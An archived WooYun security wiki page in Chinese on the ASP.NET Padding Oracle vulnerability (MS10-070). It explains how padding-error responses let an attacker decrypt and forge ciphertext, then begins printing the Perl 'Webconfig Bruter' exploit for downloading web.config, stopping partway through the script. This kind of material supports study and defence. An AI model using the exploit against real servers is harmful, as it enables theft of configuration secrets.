<!DOCTYPE html>
<!-- saved from url=(0097)https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh" lang="zh" dir="ltr" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./server_padding-oracle-attack [WooYun WiKi]_files/hm.js.下载"></script><script type="text/javascript" src="./server_padding-oracle-attack [WooYun WiKi]_files/analytics.js.下载" charset="utf-8"></script>

<script type="text/javascript">archive_analytics.values.service='wb';archive_analytics.values.server_name='wwwb-app13.us.archive.org';archive_analytics.values.server_ms=504;</script>
<script type="text/javascript" src="./server_padding-oracle-attack [WooYun WiKi]_files/wbhack.js.下载" charset="utf-8"></script>

<script type="text/javascript">
__wbhack.init('');
</script>
<link rel="stylesheet" type="text/css" href="./server_padding-oracle-attack [WooYun WiKi]_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="./server_padding-oracle-attack [WooYun WiKi]_files/iconochive.css">

<!-- End Wayback Rewrite JS Include -->
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>server:padding-oracle-attack [WooYun WiKi]</title>
  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="shortcut icon" href="https://web.archive.org/web/20160629065624im_/http://wiki.wooyun.org:80/lib/tpl/bootstrap3/images/favicon.ico">
<link rel="apple-touch-icon" href="https://web.archive.org/lib/tpl/bootstrap3/images/apple-touch-icon.png">
      <link type="text/css" rel="stylesheet" href="./server_padding-oracle-attack [WooYun WiKi]_files/bootstrap.min.css">
    <script type="text/javascript">/*<![CDATA[*/
    var TPL_CONFIG = {"tableFullWidth":1};
  /*!]]>*/</script>
  <meta name="generator" content="DokuWiki">
<meta name="robots" content="index,follow">
<meta name="keywords" content="server,padding-oracle-attack">
<link rel="search" type="application/opensearchdescription+xml" href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/lib/exe/opensearch.php" title="WooYun WiKi">
<link rel="start" href="https://web.archive.org/">
<link rel="contents" href="https://web.archive.org/server:padding-oracle-attack?do=index" title="网站地图">
<link rel="alternate" type="application/rss+xml" title="最近更改" href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/feed.php">
<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/feed.php?mode=list&amp;ns=server">
<link rel="alternate" type="text/html" title="纯HTML" href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/_export/xhtml/server:padding-oracle-attack">
<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/_export/raw/server:padding-oracle-attack">
<link rel="canonical" href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org/server:padding-oracle-attack">
<link rel="stylesheet" type="text/css" href="./server_padding-oracle-attack [WooYun WiKi]_files/css.php">
<script type="text/javascript">/*<![CDATA[*/var NS='server';var JSINFO = {"id":"server:padding-oracle-attack","namespace":"server","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="./server_padding-oracle-attack [WooYun WiKi]_files/js.php"></script>
<link rel="stylesheet" type="text/css" href="./server_padding-oracle-attack [WooYun WiKi]_files/prettify.css">
  <script type="text/javascript" src="./server_padding-oracle-attack [WooYun WiKi]_files/bootstrap.min.js.下载"></script>
  <style type="text/css">
    body { padding-top: 20px; }
  </style>
  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body class="default page-on-panel"><div id="wm-ipp" lang="en" style="display: block; direction: ltr;">
<div style="position:fixed;left:0;top:0;width:100%!important">
<div id="wm-ipp-inside">
  <table style="width:100%;">
    <tbody>
      <tr>
	<td id="wm-logo">
	  <a href="https://web.archive.org/web/" title="Wayback Machine home page"><img src="./server_padding-oracle-attack [WooYun WiKi]_files/wayback-toolbar-logo.png" alt="Wayback Machine" width="110" height="39" border="0"></a>
	</td>
	<td class="c">
	  <table style="margin:0 auto;">
	    <tbody>
	      <tr>
		<td class="u" colspan="2">
		  <form target="_top" method="get" action="https://web.archive.org/web/submit" name="wmtb" id="wmtb" class="form-inline"><input type="text" name="url" id="wmtbURL" value="http://wiki.wooyun.org:80/server:padding-oracle-attack" style="width:400px;" onfocus="this.focus();this.select();" autocomplete="off" class="form-control"><input type="hidden" name="type" value="replay"><input type="hidden" name="date" value="20160629065624"><input type="submit" value="Go" class="btn btn-default"></form>
		</td>
		<td class="n" rowspan="2">
		  <table>
		    <tbody>
		      <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
		      <tr class="m">
			<td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20160307185137/http://wiki.wooyun.org:80/server:padding-oracle-attack" title="07 Mar 2016"><strong>Mar</strong></a></td>
			<td class="c" id="displayMonthEl" title="You are here: 06:56:24 Jun 29, 2016">JUN</td>
			<td class="f" nowrap="nowrap">Jul</td>
		      </tr>
		      <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
		      <tr class="d">
			<td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20160307185137/http://wiki.wooyun.org:80/server:padding-oracle-attack" title="18:51:37 Mar 07, 2016"><img src="./server_padding-oracle-attack [WooYun WiKi]_files/wm_tb_prv_on.png" alt="Previous capture" width="14" height="16" border="0"></a></td>
			<td class="c" id="displayDayEl" style="width:34px;font-size:24px;" title="You are here: 06:56:24 Jun 29, 2016">29</td>
			<td class="f" nowrap="nowrap"><img src="./server_padding-oracle-attack [WooYun WiKi]_files/wm_tb_nxt_off.png" alt="Next capture" width="14" height="16" border="0"></td>
		      </tr>
		      <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
		      <tr class="y">
			<td class="b" nowrap="nowrap">2015</td>
			<td class="c" id="displayYearEl" title="You are here: 06:56:24 Jun 29, 2016">2016</td>
			<td class="f" nowrap="nowrap">2017</td>
		      </tr>
		    </tbody>
		  </table>
		</td>
	      </tr>
	      <tr>
		<td class="s">
		  		  <div id="wm-nav-captures"><a class="t" href="https://web.archive.org/web/*/http://wiki.wooyun.org:80/server:padding-oracle-attack" title="See a list of every capture for this URL">2 captures</a><div class="r" title="Timespan for captures of this URL">7 Mar 2016 - 29 Jun 2016</div></div>
		</td>
		<td class="k">
		  <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack" id="wm-graph-anchor">
		    <div id="wm-ipp-sparkline" title="Explore captures for this URL" style="position: relative">
		      <canvas id="wm-sparkline-canvas" width="550" height="27" border="0"></canvas>
		    <div class="yt" style="display: none; width: 25px; height: 27px;"></div><div class="mt" style="display: none; width: 2px; height: 27px;"></div></div>
		  </a>
		</td>
	      </tr>
	    </tbody>
	  </table>
	</td>
	<td class="r">
	  <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#" onclick="window.open(&#39;https://www.facebook.com/sharer/sharer.php?u=https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack&#39;, &#39;&#39;, &#39;height=400,width=600&#39;); return false;" title="Share on Facebook" style="top: 4px; right: 16px;" target="_blank"><span class="iconochive-facebook" style="color:#3b5998;font-size:160%;"></span></a>
	  <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#" onclick="window.open(&#39;https://twitter.com/intent/tweet?text=https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack&amp;via=internetarchive&#39;, &#39;&#39;, &#39;height=400,width=600&#39;); return false;" title="Share on Twitter" style="bottom:14px;right:16px;" target="_blank"><span class="iconochive-twitter" style="color:#1dcaff;font-size:160%;"></span></a>
	  <a href="http://faq.web.archive.org/" title="Get some help using the Wayback Machine" style="bottom:14px;right:5px;padding-right:0;"><span class="iconochive-question" style="color:rgb(87,186,244);font-size:160%;"></span></a>
	  <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#close" onclick="__wm.h(event);return false;" style="top:-2px;right:0;padding-right:0;" title="Close the toolbar"><span class="iconochive-remove-circle" style="color:#888888;font-size:240%;"></span></a>
	  <a id="wm-expand" class="wm-btn" href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#expand" onclick="__wm.ex(event);return false;"><span class="iconochive-down-solid"></span> <span style="font-size:80%">About this capture</span></a>
	</td>
      </tr>
    </tbody>
  </table>
    <div id="wm-capinfo" style="border-top:1px solid #777;display:none;">
            <div style="background-color:#353535;color:#aaa;font-weight:bold;text-align:center;"><a class="wm-selector selected" href="javascript:void(0)">COLLECTED BY</a></div>
    <div style="padding:3px;position:relative;">
            <div style="display:inline-block;vertical-align:top;width:50%;">
			<span class="c-logo" style="background-image:url(https://archive.org/services/img/alexacrawls);"></span>
		Organization: <a style="color:#33f;" href="https://archive.org/details/alexacrawls" target="_new"><span class="wm-title">Alexa Crawls</span></a>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  Starting in 1996, <a href="http://www.alexa.com/">Alexa Internet</a> has been donating their crawl data to the Internet Archive.  Flowing in every day, these data are added to the <a href="http://web.archive.org/">Wayback Machine</a> after an embargo period.
	</div>
	      </div>
      <div style="display:inline-block;vertical-align:top;width:49%;">
			<span class="c-logo" style="background-image:url(https://archive.org/services/img/alexacrawls)"></span>
		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/alexacrawls" target="_new"><span class="wm-title">Alexa Crawls</span></a></div>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  Starting in 1996, <a href="http://www.alexa.com/">Alexa Internet</a> has been donating their crawl data to the Internet Archive.  Flowing in every day, these data are added to the <a href="http://web.archive.org/">Wayback Machine</a> after an embargo period.
	</div>
	      </div>
    </div></div></div></div></div><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script type="text/javascript" src="./server_padding-oracle-attack [WooYun WiKi]_files/timestamp.js.下载" charset="utf-8"></script>
<script type="text/javascript" src="./server_padding-oracle-attack [WooYun WiKi]_files/graph-calc.js.下载" charset="utf-8"></script>
<script type="text/javascript" src="./server_padding-oracle-attack [WooYun WiKi]_files/auto-complete.js.下载" charset="utf-8"></script>
<script type="text/javascript" src="./server_padding-oracle-attack [WooYun WiKi]_files/toolbar.js.下载" charset="utf-8"></script>

<style type="text/css">
body {
  margin-top:0 !important;
  padding-top:0 !important;
  min-width:800px !important;
}
.wb-autocomplete-suggestions {
    text-align: left; cursor: default; border: 1px solid #ccc; border-top: 0; background: #fff; box-shadow: -1px 1px 3px rgba(0,0,0,.1);
    position: absolute; display: none; z-index: 2147483647; max-height: 254px; overflow: hidden; overflow-y: auto; box-sizing: border-box;
}
.wb-autocomplete-suggestion { position: relative; padding: 0 .6em; line-height: 23px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 1.02em; color: #333; }
.wb-autocomplete-suggestion b { font-weight: bold; }
.wb-autocomplete-suggestion.selected { background: #f0f0f0; }
</style>
<script type="text/javascript">
__wm.bt(550,27,25,2,"web","http://wiki.wooyun.org:80/server:padding-oracle-attack","2016-06-29",1996);
</script><div class="wb-autocomplete-suggestions " style="left: 478px; top: 22px; width: 400px;"></div>
<!-- END WAYBACK TOOLBAR INSERT -->
  <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->

  <div id="dokuwiki__site" class="container">
    <div id="dokuwiki__top" class="site dokuwiki mode_show tpl_bootstrap3    hasSidebar">

      
      <!-- header -->
      <div id="dokuwiki__header">
        <nav class="navbar  navbar-default" role="navigation">

  <div class="container-fluid">

    <div class="navbar-header">

      <button class="navbar-toggle btn btn-default" type="button" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>

      <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/WooYun%20WiKi" accesskey="h" title="[H]" class="navbar-brand"><img src="./server_padding-oracle-attack [WooYun WiKi]_files/logo.png" alt="WooYun WiKi" class="pull-left" id="dw__logo" width="20" height="20"> <span id="dw__title">WooYun WiKi</span></a>
    </div>

    <div class="collapse navbar-collapse">

      <ul class="nav navbar-nav" id="dw__navbar">
        <li class="active">
  <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/WooYun%20WiKi"><i class="glyphicon glyphicon-home"></i> Home</a></li>
      </ul>

      <div class="navbar-right">

        <form action="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/WooYun%20WiKi" accept-charset="utf-8" class="search form-inline nav navbar-nav navbar-form" id="dw__search" method="get" role="search"><div class="no"><input type="hidden" name="do" value="search"><input type="search" id="qsearch__in" accesskey="f" name="id" class="edit form-control" title="[F]" placeholder="搜索"><button type="submit" class="btn btn-default" title="搜索"><i class="glyphicon glyphicon-search"></i></button><div id="qsearch__out" class="ajax_qsearch JSpopup panel panel-default" style="display: none;"></div></div></form>
        <ul class="nav navbar-nav" id="dw__tools">
  <li class="dropdown">
    <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#" class="dropdown-toggle" data-toggle="dropdown" title="工具"><i class="glyphicon glyphicon-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">工具</span> <span class="caret"></span></a>
    <ul class="dropdown-menu tools" role="menu">

      <!-- dokuwiki__usertools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-user"></i> 用户工具</li>
      
      <li class="divider"></li>

      <!-- dokuwiki__sitetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-cog"></i> 站点工具</li>
      <li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack?do=recent" class="action recent" accesskey="r" rel="nofollow" title="最近更改 [R]"><i class="glyphicon glyphicon-list-alt"></i> 最近更改</a></li><li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack?do=media&amp;ns=server" class="action media" rel="nofollow" title="媒体管理器"><i class="glyphicon glyphicon-picture"></i> 媒体管理器</a></li><li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack?do=index" class="action index" accesskey="x" rel="nofollow" title="网站地图 [X]"><i class="glyphicon glyphicon-list"></i> 网站地图</a></li>
      <li class="divider"></li>

      <!-- dokuwiki__pagetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-file"></i> 页面工具</li>
      <li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack?do=edit" class="action source" accesskey="v" rel="nofollow" title="显示源文件 [V]"><i class="glyphicon glyphicon-edit"></i> 显示源文件</a></li><li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack?do=revisions" class="action revs" accesskey="o" rel="nofollow" title="修订记录 [O]"><i class="glyphicon glyphicon-time"></i> 修订记录</a></li><li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack?do=backlink" class="action backlink" rel="nofollow" title="反向链接"><i class="glyphicon glyphicon-link"></i> 反向链接</a></li><li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#dokuwiki__top" class="action top" accesskey="t" rel="nofollow" title="回到顶部 [T]"><i class="glyphicon glyphicon-chevron-up"></i> 回到顶部</a></li>
    </ul>
  </li>
</ul>

        <ul class="nav navbar-nav">
          <li>
                      </li>
                    <li><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack?do=login&amp;sectok=0ce9b0b1494b67493913fc3aba5f120f" class="action login" rel="nofollow" title="登录"><i class="glyphicon glyphicon-log-in"></i> 登录</a></li>        </ul>

      </div>

    </div>
  </div>
</nav>
      </div>
      <!-- /header -->

      
            <div id="dw__breadcrumbs">
        <hr>
                        <div class="breadcrumb hidden-print"><span class="bchead">您的足迹:</span> <span class="bcsep">•</span> <a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:host" class="breadcrumbs" title="server:host">host</a> <span class="bcsep">•</span> <span class="curid"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack" class="breadcrumbs" title="server:padding-oracle-attack">padding-oracle-attack</a></span></div>
                <hr>
      </div>
      
      <p class="pageId text-right">
        <span class="label label-default">server:padding-oracle-attack</span>
      </p>

      <div id="dw__msgarea">
              </div>

      <main class="main row" role="main">

        <!-- ********** ASIDE ********** -->
<aside id="dokuwiki__aside" class="dw__sidebar col-sm-3 col-md-2 hidden-print">
  <div class="content">
    <div class="toogle hidden-lg hidden-md hidden-sm" data-toggle="collapse" data-target="#dokuwiki__aside .collapse">
      <i class="glyphicon glyphicon-th-list"></i> 侧边栏    </div>
    <div class="collapse in">
            
<h4 id="企业安全">企业安全</h4>
<div class="level4">
<ul class="nav nav-pills nav-stacked">
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/enterprise:information" class="wikilink1" title="enterprise:information">信息收集</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/enterprise:server" class="wikilink1" title="enterprise:server">服务配置</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/enterprise:web" class="wikilink1" title="enterprise:web">Web应用</a>
</li>
<li class="level1 active"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/enterprise:tools" class="wikilink1" title="enterprise:tools">安全工具</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/enterprise:defence" class="wikilink1" title="enterprise:defence">安全防御</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/enterprise:pentest" class="wikilink1" title="enterprise:pentest">渗透技巧</a>
</li>
</ul>

</div>

<h4 id="android_安全">Android 安全</h4>
<div class="level4">
<ul class="nav nav-pills nav-stacked">
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/android:client" class="wikilink1" title="android:client">客户端</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/android:system" class="wikilink1" title="android:system">系统</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/android:communicate" class="wikilink1" title="android:communicate">通信</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/android:server" class="wikilink1" title="android:server">服务端</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/android:tools" class="wikilink1" title="android:tools">常用工具</a>
</li>
</ul>

</div>

<h4 id="乌云">乌云</h4>
<div class="level4">
<ul class="nav nav-pills nav-stacked">
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/wooyun:route" class="wikilink1" title="wooyun:route">乌云路由</a>
</li>
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/wooyun:woobuntu" class="wikilink1" title="wooyun:woobuntu">Woobuntu</a>
</li>
</ul>

</div>

<h4 id="apt">APT</h4>
<div class="level4">
<ul class="nav nav-pills nav-stacked">
<li class="level1"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/apt:organization" class="wikilink1" title="apt:organization">组织</a>
</li>
</ul>

</div>

<h4 id="find_us">Find Us</h4>
<div class="level4">
<ul class="nav nav-pills nav-stacked">
<li class="level1">Email: wiki@wooyun.org

</li>
</ul>

</div>
          </div>
  </div>
</aside>

        <!-- ********** CONTENT ********** -->
        <article id="dokuwiki__content" class="col-sm-9 col-md-10">

          <div class="panel panel-default"> 
            <div class="page group panel-body">

                                          
              <div class="pull-right hidden-print affix-top" data-spy="affix" data-offset-top="150" style="z-index:1024; top:10px; right:10px;">
                <!-- TOC START -->
<div id="dw__toc" class="panel panel-default" style="background-color: rgb(255, 255, 255);">
<h3 class="toggle panel-heading closed" style="cursor: pointer;"><i class="glyphicon glyphicon-list" style="padding-right: 5px"></i> <strong class="glyphicon glyphicon-chevron-down"><span>+</span></strong><span class="label hide">目录</span></h3>
<div class="panel-body" style="display: none;">

<ul class="toc" aria-expanded="false" style="display: none;">
<li class="level1"><div class="li"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#padding_oracle">Padding Oracle</a></div>
<ul class="toc">
<li class="clear">
<ul class="toc">
<li class="level3"><div class="li"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#漏洞简介">1、漏洞简介</a></div></li>
<li class="level3"><div class="li"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#漏洞成因">2、漏洞成因</a></div></li>
<li class="level3"><div class="li"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#漏洞检测及利用">3、漏洞检测及利用</a></div></li>
<li class="level3"><div class="li"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#实际案例">4、实际案例</a></div></li>
<li class="level3"><div class="li"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#漏洞修复">5、漏洞修复</a></div></li>
<li class="level3"><div class="li"><a href="https://web.archive.org/web/20160629065624/http://wiki.wooyun.org:80/server:padding-oracle-attack#相关资源">6、相关资源</a></div></li>
</ul></li>
</ul></li>
</ul>
</div>
</div>
<!-- TOC END -->
              </div>

              <!-- wikipage start -->
              
<h1 class="sectionedit1 page-header" id="padding_oracle">Padding Oracle</h1>
<div class="level1">

</div>

<h3 class="sectionedit2" id="漏洞简介">1、漏洞简介</h3>
<div class="level3">
<hr>

<p>
padding oracle又名MS10-070，是ASP.NET中由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。 虽然攻击者无法利用此漏洞来执行恶意攻击代码或直接提升他们的用户权限，但此漏洞可用于信息搜集，这些信息可用于进一步攻击受影响的系统。
</p>

</div>

<h3 class="sectionedit3" id="漏洞成因">2、漏洞成因</h3>
<div class="level3">
<hr>

<p>
在对称加密算法中，密文就是密钥加明文经过加密算法处理的结果。加密算法里面的加密是分块实施的，如DES,RC2等算法。每块固定n(8,16,32)位，有余数的情况一般按照某种规则补足，就是所谓的Padding填充，如常用的PKCS#5规则，就是根据最后一个数据块所缺少的长度来选择填充的内容。为了加强加密的效果，所以会把上一块的密文用
来混淆下一块加密数据，以此类推，用来混淆第一块数据的是预先生成的IV（初始化向量）。
</p>

<p>
对于加密算法来说，它们是基于等长的“数据块”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节，而对于Rijndael算法来说则是16、24或32字节）。但是我们的输入数据长度是不规则的，因此必然需要进行“填充”才能形成完整的块，通过这种规则我们便可以根据填充的内容来得知填充的长度，以便在解密后去除填充的字节。
</p>

<p>
一个密文被解密时也是分段进行的，在解密完成之后算法会先检查是否符合规则，如果它的Padding填充方式不符合规则，那么表示输入数据有问题。对于解密的类库来说，往往便会抛出一个PaddingError异常，提示Padding不正确。
</p>

<p>
在PaddingOracle攻击中，黑客只需要一个合法密文，即可通过不断向网站发送篡改过的密文（这个过程主要是构造IV的过程），观察是否有Padding异常错误提示，网站中的异常错误提示可能直接显示在网页当中，也可能只是HTTP状态码，根据两个不同的HTTP状态码做对比即可，而不需要其他任何详细信息。如果有异常错误提示即可不断地给网站程序提供密文，让解密程序给出错误提示，再而不断地修正，从而最终获得混淆之前的中间密文。拿到中间密文之后，可以通过构造IV，使得中间密文被逆向混淆之后得到的明文为指定内容，从而达到攻击的目的。在这过程中PaddingOracle攻击并没有破解掉加密算法的密钥，也没有能力对任意密文做逆向解密，只是可以利用一个有效密文，生成一个解密后得到任意指定内容明文的伪造密文。
</p>

</div>

<h3 class="sectionedit4" id="漏洞检测及利用">3、漏洞检测及利用</h3>
<div class="level3">
<hr>

<p>
漏洞检测利用工具<a href="https://web.archive.org/web/20160629065624/https://github.com/GDSSecurity/PadBuster" class="urlextern" title="https://github.com/GDSSecurity/PadBuster" rel="nofollow">padBuster.pl</a>与Webconfig Bruter.pl。
</p>

<p>
Webconfig Bruter.pl
</p>
<pre class="code perl"><span class="co1"># Source: http://blog.mindedsecurity.com/2010/10/breaking-net-encryption-with-or-without.html</span>
&nbsp;
<span class="co1">#!/usr/bin/perl</span>
<span class="co1">#</span>
<span class="co1">#</span>
<span class="co1">#  Webconfig Bruter - exploit tool for downloading Web.config</span>
<span class="co1">#</span>
<span class="co1">#  FOr use this script you need Pudbuster.</span>
<span class="co1">#  Padbuster is a great tool and Brian Holyfield deserve all the credits.</span>
<span class="co1">#  Note from Exploit-db: This very first exploit was meant to work with Padbusterdornet or Padbuster v0.2.</span>
<span class="co1">#  A similar exploitation vector was also added lately in Padbuster v0.3:</span>
<span class="co1">#  http://www.gdssecurity.com/l/b/2010/10/04/padbuster-v0-3-and-the-net-padding-oracle-attack/</span>
<span class="co1">#  http://www.exploit-db.com/sploits/padBuster.pl</span>
<span class="co1">#</span>
<span class="co1">#</span>
<span class="co1">#  Giorgio Fedon - (giorgio.fedon@mindedsecurity.com)</span>
<span class="co1">#   </span>
<span class="kw2">use</span> LWP<span class="sy0">::</span><span class="me2">UserAgent</span><span class="sy0">;</span>
<span class="kw2">use</span> strict<span class="sy0">;</span>
<span class="kw2">use</span> Getopt<span class="sy0">::</span><span class="me2">Std</span><span class="sy0">;</span>
<span class="kw2">use</span> MIME<span class="sy0">::</span><span class="me2">Base64</span><span class="sy0">;</span>
<span class="kw2">use</span> URI<span class="sy0">::</span><span class="me2">Escape</span><span class="sy0">;</span>
<span class="kw2">use</span> Getopt<span class="sy0">::</span><span class="me2">Long</span><span class="sy0">;</span>
<span class="co1">#Definition of vars for .NET</span>
<span class="kw1">my</span> <span class="re0">$toEncodeDecode</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$b64Encoded</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$string</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$returnVal</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$testUrl</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$testBytes</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$sampleBytes</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$testUrl</span> <span class="sy0">=</span> <span class="sy0">@</span><span class="kw2">ARGV</span><span class="br0">[</span><span class="nu0">0</span><span class="br0">]</span><span class="sy0">.</span><span class="st0">"<span class="es0">\?</span>d<span class="es0">\=</span>"</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$sampleBytes</span> <span class="sy0">=</span> <span class="sy0">@</span><span class="kw2">ARGV</span><span class="br0">[</span><span class="nu0">1</span><span class="br0">]</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$blockSize</span> <span class="sy0">=</span> <span class="sy0">@</span><span class="kw2">ARGV</span><span class="br0">[</span><span class="nu0">2</span><span class="br0">]</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$#ARGV</span> <span class="sy0">&lt;</span> <span class="nu0">2</span><span class="br0">)</span> <span class="br0">{</span>
 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/die.html"><span class="kw3">die</span></a> <span class="st0">"   
  Use: Web.config_bruter.pl ScriptResourceUrl Encrypted_Sample BlockSize
  Where: URL = The target URL (and query string if applicable)
         EncryptedSample = The encrypted value you want to use.
         This need to come from Padbuster.
         BlockSize = The block size being used by the algorithm (8 or 16)
         Poc code by giorgio.fedon<span class="es0">\@</span>mindedsecurity.com
  Original Padbuster code from Brian Holyfield - Gotham Digital Science
&nbsp;
Command Example:
./Web.config_bruter.pl https://127.0.0.1:8083/ScriptResource.axd  d1ARvno0iSA6Ez7Z0GEAmAy3BpX8a2 16
&nbsp;
"</span><span class="sy0">;</span><span class="br0">}</span>
&nbsp;
<span class="kw1">my</span> <span class="re0">$method</span> <span class="sy0">=</span> <span class="st0">"GET"</span><span class="sy0">;</span>
<span class="re0">$sampleBytes</span> <span class="sy0">=</span> encoder<span class="br0">(</span><span class="re0">$sampleBytes</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$testBytes</span> <span class="sy0">=</span> <span class="st0">"<span class="es0">\x</span>00"</span> x <span class="re0">$blockSize</span><span class="sy0">;</span>
